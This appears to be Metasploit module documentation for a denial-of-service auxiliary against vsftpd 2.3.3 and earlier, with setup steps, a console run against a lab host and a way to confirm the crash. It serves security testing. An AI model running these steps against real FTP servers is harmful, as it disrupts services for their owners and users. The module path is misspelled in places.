## Vulnerable Application

This is an auxiliary for DOSing a VSFTPD server from version 2.3.3 and below.

## Verification Steps

1. Start `msfconsole`
2. `use auxiliary/dos/ftp/vstfpd_232`
3. `set rhosts`
4. `set ftpuser`
5. `set ftppass`
6. `run`

## Scenarios

### VSFTPD 2.3.2 - Arch linux

```
msf6 > use auxiliary/dos/ftp/vsftpd_232
msf6 auxiliary(dos/ftp/vstfpd_232) > set rhosts 192.168.56.106
rhosts => 192.168.56.106
msf6 auxiliary(dos/ftp/vstfpd_232) > set ftpuser anonymous
ftpuser => anonymous
msf6 auxiliary(dos/ftp/vstfpd_232) > set ftppass ''
ftppass => 
msf6 auxiliary(dos/ftp/vstfpd_232) > run
[*] Running module against 192.168.56.106

[*] 192.168.56.106:21 - sending payload
.............................................................................................
[+] 192.168.56.106:21 - Stream was cut off abruptly. Appears DOS attack succeeded.
[*] Auxiliary module execution completed
```

You can verify that it works by either attempting to ftp into the machine after or checking htop on the machine. If the CPU is at max capacity, that would be due to the DOS.
